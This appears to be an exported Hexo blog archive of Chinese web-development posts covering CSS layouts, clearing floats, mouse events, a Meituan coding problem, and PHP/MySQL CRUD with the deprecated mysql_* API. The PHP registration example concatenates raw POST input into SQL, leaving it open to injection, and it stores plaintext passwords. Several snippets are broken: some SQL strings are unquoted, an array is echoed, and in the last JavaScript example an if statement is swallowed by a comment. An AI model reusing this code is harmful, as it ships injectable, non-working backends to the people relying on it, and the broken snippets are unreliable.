<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="双飞翼布局（三栏布局）"><a href="#双飞翼布局（三栏布局）" class="headerlink" title="双飞翼布局（三栏布局）"></a>双飞翼布局（三栏布局）</h1><p><img src="http://static.simmzl.cn/blog/171120/lJbfFK4K6I.png?imageslim" alt="mark"></p>
<h2 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="负margin-1"><a href="#负margin-1" class="headerlink" title="负margin"></a>负margin</h2><p>原理同左侧定宽，右侧自适应布局的负margin方法。<br>将content放置在文档流前面可以让其优先渲染。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol><li>三者都设置向左浮动。</li><li>设置wrapper宽度为100%。</li><li>设置 负边距，left设置负左边距为100%，right设置负左边距为负的自身宽度。</li><li>设置content的margin值给左右两个子面板留出空间。</li></ol>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">margin </span>: <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="计算宽度calc"><a href="#计算宽度calc" class="headerlink" title="计算宽度calc()"></a>计算宽度calc()</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.left</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span> - <span class="number">400px</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库的连接、增删查改等操作以及PHP相应功能的实现</title>
    <url>/2017/12/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%BF%9E%E6%8E%A5%E3%80%81%E5%A2%9E%E5%88%A0%E6%9F%A5%E6%94%B9%E7%AD%89%E6%93%8D%E4%BD%9C%E4%BB%A5%E5%8F%8APHP%E7%9B%B8%E5%BA%94%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E7%8E%B0.html</url>
    <content><![CDATA[<p><img src="http://static.simmzl.cn/blog/171231/EB789gDI79.png?imageslim" alt="mark"><br>最近做的项目后端要自己写，总结一下数据库基本的连接、增删查改等语句以及相应功能利用PHP实现。<br><a id="more"></a></p>
<h1 id="连接-关闭-MySQL主机"><a href="#连接-关闭-MySQL主机" class="headerlink" title="连接/关闭 MySQL主机"></a>连接/关闭 MySQL主机</h1><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p><code>mysql_connect()</code> 函数打开非持久的 MySQL 连接，它最常用到的三个参数是MySQL主机名称、用户名、密码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php</span></span><br><span class="line"><span class="comment">// MySQL主机名称，通常是 localhost</span></span><br><span class="line">$mysql_server_name=<span class="string">'localhost'</span>;</span><br><span class="line"><span class="comment">// 资料库的帐号</span></span><br><span class="line">$mysql_username=<span class="string">'username'</span>;</span><br><span class="line"><span class="comment">// 资料库的帐号密码</span></span><br><span class="line">$mysql_password=<span class="string">'password'</span>;</span><br><span class="line"><span class="comment">// 数据库的名称</span></span><br><span class="line">$mysql_database=<span class="string">'your_database'</span>;</span><br><span class="line"><span class="comment">// 连接</span></span><br><span class="line">$con=mysql_connect($mysql_server_name,$mysql_username,$mysql_password) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error connecting"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以上可以简写</span></span><br><span class="line">$con=mysql_connect(<span class="string">'localhost'</span>,<span class="string">'username'</span>,<span class="string">'password'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error connecting"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库输出编码</span></span><br><span class="line">mysql_query(<span class="string">"set names 'utf8'"</span>);</span><br><span class="line"><span class="comment">// 打开数据库'your_database'</span></span><br><span class="line">mysql_select_db($mysql_database);</span><br><span class="line"><span class="comment">// 定义sql语句</span></span><br><span class="line">$sql = <span class="string">"select * from table where username = demo"</span>;</span><br><span class="line"><span class="comment">// 执行sql语句</span></span><br><span class="line">$row = mysql_query($sql,$con); <span class="comment">//查询</span></span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 关闭mysql连接</span></span><br><span class="line">mysql_close($con);</span><br></pre></td></tr></table></figure>
<h1 id="执行MySQL语句"><a href="#执行MySQL语句" class="headerlink" title="执行MySQL语句"></a>执行MySQL语句</h1><p><code>mysql_query(query,connection)</code>函数执行一条 MySQL 查询，如果查询执行不正确则返回 FALSE。</p>
<ul>
<li><code>query</code> MySQL语句</li>
<li><code>connection</code> 主机连接，如果未规定，则使用上一个打开的连接。</li>
</ul>
<h1 id="新建-删除-数据库"><a href="#新建-删除-数据库" class="headerlink" title="新建/删除 数据库"></a>新建/删除 数据库</h1><h2 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h2><p>MySQL语句：<code>CREATE DATABASE my_db</code>；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义sql语句</span></span><br><span class="line">$sql = <span class="string">"CREATE DATABASE my_db"</span>;</span><br><span class="line"><span class="comment">// 执行sql语句</span></span><br><span class="line">$row = mysql_query($sql,$con);</span><br></pre></td></tr></table></figure>
<h2 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2><p>MySQL语句：<code>DROP DATABASE my_db</code>；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"DROP DATABASE my_db"</span>;</span><br><span class="line">$row = mysql_query($sql,$con);</span><br></pre></td></tr></table></figure>
<h1 id="新建-删除-数据表"><a href="#新建-删除-数据表" class="headerlink" title="新建/删除 数据表"></a>新建/删除 数据表</h1><h2 id="新建-1"><a href="#新建-1" class="headerlink" title="新建"></a>新建</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name column_type);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>column_name</code> 为列名，即字段名</li>
<li><code>column_type</code> 为该字段属性</li>
</ul>
<p>phpMyAdmin:</p>
<p><img src="http://static.simmzl.cn/blog/171231/G5i3iL06ge.png?imageslim" alt="mark"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"CREATE TABLE  `machine_data`.`00000003` (</span></span><br><span class="line"><span class="string">`id` INT( 20 ) NOT NULL AUTO_INCREMENT PRIMARY KEY ,</span></span><br><span class="line"><span class="string">`date` INT( 20 ) NOT NULL ,</span></span><br><span class="line"><span class="string">`wind_speed` FLOAT NOT NULL ,</span></span><br><span class="line"><span class="string">`temperature` FLOAT NOT NULL ,</span></span><br><span class="line"><span class="string">`humidity` FLOAT NOT NULL</span></span><br><span class="line"><span class="string">) ENGINE = MYISAM"</span></span><br><span class="line">$result = mysql_query($sql,$con);</span><br></pre></td></tr></table></figure>
<h2 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name ;</span><br></pre></td></tr></table></figure>
<h1 id="向表中插入数据（增）INSERT"><a href="#向表中插入数据（增）INSERT" class="headerlink" title="向表中插入数据（增）INSERT"></a>向表中插入数据（增）INSERT</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( field1, field2,...fieldN )</span><br><span class="line">                       <span class="keyword">VALUES</span></span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure>
<p>例如用户注册功能：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// POST接收（默认已运行addslashes()转义字符）</span></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"insert into user (username,password,email) values ('&#123;$username&#125;','&#123;$password&#125;','&#123;$email&#125;')"</span>;</span><br><span class="line">$result = mysql_query($sql,$con);</span><br></pre></td></tr></table></figure>
<h1 id="删-DELETE"><a href="#删-DELETE" class="headerlink" title="删 DELETE"></a>删 DELETE</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name [<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure>
<p>ps: 如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。</p>
<p>例如删除用户名为<code>simmzl</code>的用户：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">" DELETE FROM user WHERE username = simmzl "</span>;</span><br></pre></td></tr></table></figure>
<h1 id="查-SELECT"><a href="#查-SELECT" class="headerlink" title="查 SELECT"></a>查 SELECT</h1><h2 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name... <span class="keyword">FROM</span> table_name</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br><span class="line">[<span class="keyword">LIMIT</span> N][ <span class="keyword">OFFSET</span> M]</span><br></pre></td></tr></table></figure>
<ul>
<li>也可以使用<code>*</code> 代替<code>column_name</code>，表示查询所有。</li>
<li><code>LIMIT</code> 设定返回的记录数</li>
<li><code>OFFSET</code> 设定开始查询的数据偏移量。默认情况下偏移量为0。</li>
</ul>
<p>例如查询用户名为<code>simmzl</code>的用户信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据库输出编码</span></span><br><span class="line">mysql_query(<span class="string">"set names 'utf8'"</span>);</span><br><span class="line"><span class="comment">// 打开数据库'your_database'</span></span><br><span class="line">mysql_select_db(<span class="string">"my_db"</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM user WHERE USERNAME = simmzl"</span>;</span><br><span class="line">$result = mysql_query($sql, $con);</span><br></pre></td></tr></table></figure>
<h2 id="ORDER-BY-排序"><a href="#ORDER-BY-排序" class="headerlink" title="ORDER BY 排序"></a>ORDER BY 排序</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ORDER BY field1, [field2...] [ASC [DESC]]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ASC</code> 升序</li>
<li><code>DESC</code>降序</li>
</ul>
<p>例如将所有用户信息输出并按照<code>username</code>升序排序：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM user ORDER BY username ASC"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="mysql-fetch-array"><a href="#mysql-fetch-array" class="headerlink" title="mysql_fetch_array()"></a>mysql_fetch_array()</h2><p><code>mysql_query()</code> 仅对 <code>SELECT</code>语句返回一个资源标识符，因此还需要使用<code>mysql_fetch_array(data,array_type)</code>将取得的数据转成数组。</p>
<p><code>array_type</code>有三个值：</p>
<ul>
<li><code>MYSQL_ASSOC</code> - 关联数组，如： [username] =&gt; simmzl</li>
<li><code>MYSQL_NUM</code> - 数字数组，如：[0] =&gt; simmzl</li>
<li><code>MYSQL_BOTH</code> - 默认。同时产生关联和数字数组</li>
</ul>
<p>因此，在执行<code>$result = mysql_query($sql, $con)</code>后，还需执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转成关联数组</span></span><br><span class="line">$res = mysql_fetch_array($result,MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[username] =&gt; simmzl</span><br><span class="line">[pwd] =&gt; xxx</span><br><span class="line">[email] =&gt; me@simmzl.cn</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>在当<code>mysql_query()</code>查询结果有多行时，依次调用<code>mysql_fetch_array()</code>将返回结果集中的下一行，如果没有更多行则返回 FALSE。<br>因此使用while循环取出所有行数据：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>($tmp[] = mysql_fetch_array($result,MYSQL_ASSOC))&#123;&#125;;</span><br><span class="line"><span class="comment">// tmp[]最后一个值为flase，故删除</span></span><br><span class="line">array_pop($tmp);</span><br></pre></td></tr></table></figure>
<h2 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode()"></a>json_encode()</h2><p>将<strong>数组</strong>转成<strong>前端</strong>想要的<strong>JSON格式</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> json_encode($res);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"simmzl"</span>,</span><br><span class="line">    <span class="string">"pwd"</span>: <span class="string">"xxx"</span>,</span><br><span class="line">    <span class="string">"email"</span>: <span class="string">"me@simmzl.cn"</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode()"></a>json_decode()</h2><p>相反，将JSON转成数组。</p>
<h1 id="改-UPDATE"><a href="#改-UPDATE" class="headerlink" title="改 UPDATE"></a>改 UPDATE</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> field1=<span class="keyword">new</span>-value1, field2=<span class="keyword">new</span>-value2</span><br><span class="line">[<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure>
<p>例如修改<code>simmzl</code>的密码和邮箱：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE user SET pwd = xxxx, email = hr@simmzl.cn WHERE username = simmzl"</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Database</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>标签间隔和mouseout子元素触发</title>
    <url>/2017/08/%E6%A0%87%E7%AD%BE%E9%97%B4%E9%9A%94%E5%92%8Cmouseout%E5%AD%90%E5%85%83%E7%B4%A0%E8%A7%A6%E5%8F%91.html</url>
    <content><![CDATA[<p><strong>Q：</strong>设置了几个a标签，设marign和padding均为0时，a标签之间仍有间隔；<br><strong>A：</strong></p>
<ul>
<li><p>去掉a标签之间的空格，换行等，实现<code>&lt;a&gt;&lt;/a&gt;&lt;a&gt;&lt;/a&gt;&lt;a&gt;&lt;/a&gt;</code></p>
</li>
<li><p>父级设置font-size:0；子级再设置具体的font-size；</p>
</li>
</ul>
<a id="more"></a>
<p><strong>Q：</strong> 为元素P添加mouseout事件时，当鼠标移到其子元素a时，也会触发事件。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>A：</strong>这是js原生自带的问题，解决方法两种：</p>
<ul>
<li>使用mouseleave替代mouseout;</li>
<li>onmouseenter 事件不支持冒泡 ;</li>
<li>不过mouseenter和mouseleave有个小问题：让鼠标从文档外直接进入绑定事件的元素时，mouseenter不生效；</li>
<li>使用jQ的mouseout替代原生的onmouseout；</li>
</ul>
<p><strong>拓展：</strong></p>
<ul>
<li>onmouseenter对应onmouseleave;</li>
<li>onmouseover对应onmouseout;</li>
<li>onmouseup（鼠标按键被松开时）对应onmousedown.</li>
</ul>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>Q&amp;A</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>清除浮动的6种方法</title>
    <url>/2017/09/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8%E7%9A%846%E7%A7%8D%E6%96%B9%E6%B3%95.html</url>
    <content><![CDATA[<p>看到一些清除浮动的方法，自己试了一遍之后的总结。</p>
<p>HTML：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"float:left"</span>&gt;</span>Left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'float:right'</span>&gt;</span>Right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span></span><br><span class="line">    div2</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<ul>
<li>父级div1定义伪类:after。有点麻烦，代码多，很多网站使用，跟<code>&lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;</code>很相似;</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.div1</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>:<span class="string">""</span>;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">    <span class="attribute">clear</span>:both;</span><br><span class="line">    <span class="comment">/*更严谨的加上下面两行*/</span></span><br><span class="line">    <span class="attribute">visibility</span>:hidden;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结尾处加空div标签clear:both，或者br标签。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>Left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>Right<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"clear:both"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--或者：&lt;br&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>父级div也浮动，需要定义宽度。都浮动的话容易出现新问题，不推荐使用。</p>
</li>
<li><p>父级div定义 display:table，不推荐。</p>
</li>
<li><p>父级div定义 overflow：auto/hidden</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.div1</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>:auto/hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>父级div定义 height。</li>
</ul>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>聊聊H5”在App内打开“这件事</title>
    <url>/2020/04/%E8%81%8A%E8%81%8AH5%E2%80%9D%E5%9C%A8App%E5%86%85%E6%89%93%E5%BC%80%E2%80%9C%E8%BF%99%E4%BB%B6%E4%BA%8B.html</url>
    <content><![CDATA[<p>在日常冲浪🏄‍♀️🏄中，我们经常看到从某App中分享出来的内容页面上，都有“App内打开”的按钮，点击可以跳转到该内容页面。<br>那么H5是如何和App交互的？</p>
<a id="more"></a>
<p># </p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>美团笔试编程题</title>
    <url>/2017/09/%E7%BE%8E%E5%9B%A2%E7%AC%94%E8%AF%95%E7%BC%96%E7%A8%8B%E9%A2%98.html</url>
    <content><![CDATA[<blockquote>
<p>2017/9/1更（找个时间熟悉熟悉赛码、牛客的在线编程环境吧，输入输出有点懵逼）</p>
</blockquote>
<p>很多主要是数组、字符串的操作；</p>
<p>还是要多学习：<a href="http://www.runoob.com/jsref/jsref-obj-array.html" target="_blank" rel="noopener">数组对象</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">slice(start,end);<span class="comment">//截取</span></span><br><span class="line">split(<span class="string">" "</span>);<span class="comment">//分割</span></span><br><span class="line">indexOf();<span class="comment">//查找是否存在，有，返回索引；无，返回-1；splice(index,howmany,item....);//删除</span></span><br><span class="line">sort(<span class="function"><span class="keyword">function</span>);//排序</span></span><br><span class="line"><span class="function"><span class="title">pop</span>(<span class="params"></span>);//删返<span class="title">last</span> <span class="title">item</span>;对应<span class="title">shift</span>(<span class="params"></span>),删返<span class="title">first</span></span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Q:</span></span><br><span class="line"><span class="comment">// 输入:</span></span><br><span class="line"><span class="comment">//     第一行n,n个超链接;</span></span><br><span class="line"><span class="comment">//     之后每行一个超链接;</span></span><br><span class="line"><span class="comment">//     然后一行m,m个已经点击过的超链接,有重复;</span></span><br><span class="line"><span class="comment">//     之后每行一个超链接；</span></span><br><span class="line"><span class="comment">// 输出:</span></span><br><span class="line"><span class="comment">//     未被点击的链接，按字典序排列;</span></span><br><span class="line"><span class="comment">// 如：</span></span><br><span class="line"><span class="comment">// 输入：</span></span><br><span class="line"><span class="comment">//     6</span></span><br><span class="line"><span class="comment">//     meituan</span></span><br><span class="line"><span class="comment">//     jindong</span></span><br><span class="line"><span class="comment">//     tb</span></span><br><span class="line"><span class="comment">//     bd</span></span><br><span class="line"><span class="comment">//     tx</span></span><br><span class="line"><span class="comment">//     sn</span></span><br><span class="line"><span class="comment">//     5/</span></span><br><span class="line">/     jindong</span><br><span class="line"><span class="comment">//     sn</span></span><br><span class="line"><span class="comment">//     tb</span></span><br><span class="line"><span class="comment">//     jd</span></span><br><span class="line"><span class="comment">//     tb</span></span><br><span class="line"><span class="comment">// 输出：</span></span><br><span class="line"><span class="comment">//     bd</span></span><br><span class="line"><span class="comment">//     meituan</span></span><br><span class="line"><span class="comment">//     tx</span></span><br><span class="line"><span class="keyword">var</span> readline =<span class="string">"6 mt jd tb bd tx sn 5 jd sn tb jd tb"</span>,clear=[],index;</span><br><span class="line"><span class="keyword">var</span> rl=readline.split(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">var</span> n = <span class="built_in">parseInt</span>(rl[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// 获取所有链接</span></span><br><span class="line"><span class="keyword">var</span> all = rl.slice(<span class="number">1</span>,n+<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 获取所有点击过的</span></span><br><span class="line"><span class="keyword">var</span> clicked = rl.slice(n+<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(all,clicked);</span></span><br><span class="line"><span class="comment">//去掉clicked重复的</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;clicked.length;i++)&#123;</span><br><span class="line">    <span class="comment">//indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。没有出现则返回-1；str.indexOf()和array.indexOf()都可以if(clear.indexOf(clicked[i]) === -1)&#123;</span></span><br><span class="line">        clear.push(clicked[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(clear);</span></span><br><span class="line"><span class="comment">// 遍历查询clear中的元素是否在all中存在，若存在，获取该元素索引，然后在all中根据索引删除它；</span></span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;clear.length;i++)&#123;</span><br><span class="line">    index = all.indexOf(clear[i]);</span><br><span class="line">    <span class="keyword">if</span>(index !== <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">// splice方法从该索引开始，删除指定数量（1个）的值，不添加新的元素</span></span><br><span class="line">        all.splice(index,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(all.sort());</span><br></pre></td></tr></table></figure>
